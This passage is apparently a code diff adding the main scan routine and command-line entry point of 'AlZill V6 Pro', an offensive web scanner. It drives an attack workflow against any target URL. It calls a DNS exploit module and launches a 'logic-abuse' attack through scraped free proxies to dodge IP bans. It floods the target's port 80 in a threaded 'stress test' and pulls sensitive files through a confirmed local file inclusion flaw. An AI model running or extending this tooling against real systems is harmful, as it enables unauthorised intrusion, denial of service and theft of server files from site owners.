+    safe_call(dns_exploit.exploit, url, verbose)
+
+    # ============================================================
+    # INFRASTRUCTURE SCANNING
+    # ============================================================
+    if auto_infra and discovered_domains:
+        cprint(f"\n[*] Auto-scanning infrastructure for {len(discovered_domains)} discovered domains...", "magenta")
+        scan_infrastructure_for_domains(discovered_domains, verbose)
+
+    # ============================================================
+    # DEEP CRAWLER
+    # ============================================================
+    if deep_scan and deep_crawler:
+        try:
+            cprint("[*] Starting Deep Crawler...", "magenta")
+            deep_crawler.run_deep_scan(url)
+        except Exception as e:
+            cprint(f"[DEEP CRAWL ERROR] {e}", "red")
+
+    # ============================================================
+    # LINK SAVING
+    # ============================================================
+    if page_content:
+        try:
+            links = extract_links_from_text(page_content, base_url=url)
+            if links:
+                output_dir = "scan_results"
+                os.makedirs(output_dir, exist_ok=True)
+                host = url.split("//")[-1].split("/")[0]
+                links_file = os.path.join(output_dir, f"links_{host}.txt")
+                save_links_to_file(links, links_file)
+                if verbose:
+                    cprint(f"[+] Saved {len(links)} links to {links_file}", "green")
+        except Exception as e:
+            if verbose:
+                cprint(f"[LINK EXTRACTION ERROR] {e}", "red")
+
+    # ============================================================
+    # ATTACK MODE (Logic-Abuse)
+    # ============================================================
+    if run_attack:
+        cprint("\n[*] Initializing AlZill Logic-Abuse Module...", "magenta", attrs=['bold'])
+        try:
+            proxy_handler_obj = proxy_handler.ProxyHandler()
+            live_proxies = proxy_handler_obj.get_free_proxies(verify=False, max_proxies=30)
+            if live_proxies:
+                cprint(f"[+] Proxy Engine: {len(live_proxies)} live proxies loaded.", "green")
+                attack_logic.trigger_advanced_attack(url, url, proxy_list=live_proxies)
+            else:
+                cprint("[!] Proxy Engine: No live proxies found. Skipping attack.", "yellow")
+        except Exception as e:
+            cprint(f"[!] Logic-Abuse Error: {e}", "red")
+
+    # ============================================================
+    # STRESS TEST MODULE
+    # ============================================================
+    if run_attack:
+        cprint("\n[*] Initializing Stress Test Module...", "magenta", attrs=['bold'])
+        try:
+            parsed = urlparse(url)
+            target_host = parsed.hostname
+            target_ip = socket.gethostbyname(target_host)
+            
+            cprint(f"[*] Target IP: {target_ip}", "blue")
+            cprint(f"[!] WARNING: This will send many requests to {target_ip}", "red")
+            cprint(f"[*] Use with caution and only on your own servers!", "yellow")
+            
+            mode = "http"
+            threads = 20
+            duration = 10
+            
+            port_flooder.flood_port(target_ip, 80, threads=threads, duration=duration, mode=mode)
+            
+        except Exception as e:
+            cprint(f"[!] Stress Test Error: {e}", "red")
+
+    # ============================================================
+    # LFI DATA EXTRACTION (محسن)
+    # ============================================================
+    if lfi_scanner and hasattr(lfi_scanner, 'vulnerable') and lfi_scanner.vulnerable:
+        cprint(f"\n[LFI Extractor] LFI vulnerability confirmed! Extracting sensitive files...", "cyan")
+        
+        vulnerable_params = getattr(lfi_scanner, 'vulnerable_params', ['file', 'page', 'path'])
+        
+        # Use session manager if available
+        session_obj = sm if sm else requests.Session()
+        
+        extracted_files = extract_lfi_files(url, vulnerable_params, session_obj, verbose)
+        
+        if extracted_files:
+            cprint(f"[+] Extracted {len(extracted_files)} sensitive files to lfi_extracted/ directory", "green")
+            for file_info in extracted_files:
+                detected_vulns.append({
+                    'type': 'LFI File Extraction',
+                    'file': file_info['path'],
+                    'saved_to': file_info['saved_as'],
+                    'severity': 'Critical'
+                })
+
+    # ============================================================
+    # FINAL SUMMARY & REPORTING
+    # ============================================================
+    if detected_vulns:
+        cprint(f"\n" + "="*60, "yellow")
+        cprint(f"[!] VULNERABILITY SUMMARY: Found {len(detected_vulns)} potential vulnerabilities!", "yellow", attrs=['bold'])
+        cprint("="*60, "yellow")
+        
+        # Count by severity
+        severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
+        for v in detected_vulns:
+            sev = v.get('severity', 'Unknown')
+            if sev in severity_count:
+                severity_count[sev] += 1
+        
+        cprint(f"    Critical: {severity_count['Critical']}", "red")
+        cprint(f"    High: {severity_count['High']}", "light_red")
+        cprint(f"    Medium: {severity_count['Medium']}", "yellow")
+        cprint(f"    Low: {severity_count['Low']}", "cyan")
+        
+        # Show first 5 vulnerabilities
+        cprint(f"\n    Top Vulnerabilities:", "white")
+        for i, v in enumerate(detected_vulns[:5], 1):
+            cprint(f"      {i}. {v.get('type', 'Unknown')} [{v.get('severity', 'Unknown')}]", "white")
+        
+        if len(detected_vulns) > 5:
+            cprint(f"      ... and {len(detected_vulns) - 5} more", "cyan")
+    else:
+        cprint(f"\n[✓] No vulnerabilities detected", "green")
+
+    # Save final unified report
+    host = url.split("//")[-1].split("/")[0]
+    save_final_report(url, host)
+
+    cprint("\n[✓] AlZill V6 Pro Scan Completed.", "green", attrs=['bold'])
+
+
+def send_request(form, data):
+    """Send POST request"""
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    
+    try:
+        response = requests.post(
+            form['action'],
+            data=data,
+            headers=headers,
+            timeout=10,
+            allow_redirects=False
+        )
+        return response
+    except:
+        dummy = requests.Response()
+        dummy._content = b""
+        dummy.status_code = 500
+        return dummy
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="AlZill Ultimate Web Scanner - Full Arsenal + Attack Mode")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output (shows errors)")
+    parser.add_argument("-m", "--messages", help="URL to fetch messages from")
+    parser.add_argument("-d", "--delay", type=float, default=1.5, help="Request delay")
+    parser.add_argument("--deep", action="store_true", help="Run deep crawler")
+    parser.add_argument("--no-infra", action="store_true", help="Disable automatic infrastructure scanning")
+    parser.add_argument("--attack", action="store_true", help="Run Logic-Abuse (Checkpoint) attack")
+    parser.add_argument("--proxy", action="store_true", help="Enable automatic proxy rotation to avoid IP ban")
+    parser.add_argument("--proxy-file", help="Use proxies from file (one per line, format: ip:port)")
+
+    args = parser.parse_args()
+    
+    scan_target(
+        url=args.url,
+        verbose=args.verbose,
+        messages_url=args.messages,
+        deep_scan=args.deep,
+        delay=args.delay,
+        auto_infra=not args.no_infra,
+        run_attack=args.attack,
+        use_proxy=args.proxy,
+        proxy_file=args.proxy_file
+    )
+
